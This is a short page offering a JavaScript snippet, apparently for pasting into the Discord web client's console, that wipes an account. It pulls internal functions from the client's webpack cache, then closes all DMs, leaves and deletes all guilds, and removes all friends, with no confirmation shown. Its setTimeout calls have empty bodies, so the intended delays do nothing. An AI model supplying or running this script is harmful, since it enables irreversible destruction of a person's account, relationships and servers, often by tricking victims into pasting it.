# Description

Removes all friends, closes all dms, and leaves all guilds from a user.

# Code

```js
var findModule = (item) => Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default[item]!==void 0).exports.default
var dms = findModule("getPrivateChannels").getPrivateChannels()

for(var k in dms){
findModule("closePrivateChannel").closePrivateChannel(k)
}
setTimeout(function() {
}, 2000);
var guilds = findModule("getGuilds").getGuilds()
var i = 0
for(var k in guilds){
findModule("leaveGuild").leaveGuild(k)
}
var guilds = findModule("getGuilds").getGuilds()
for(var k in guilds){
findModule("deleteGuild").deleteGuild(k)
}
setTimeout(function() {
}, 2000);
var friends = findModule("getRelationships").getRelationships()

for(var k in friends){
findModule("removeRelationship").removeRelationship(k)
}
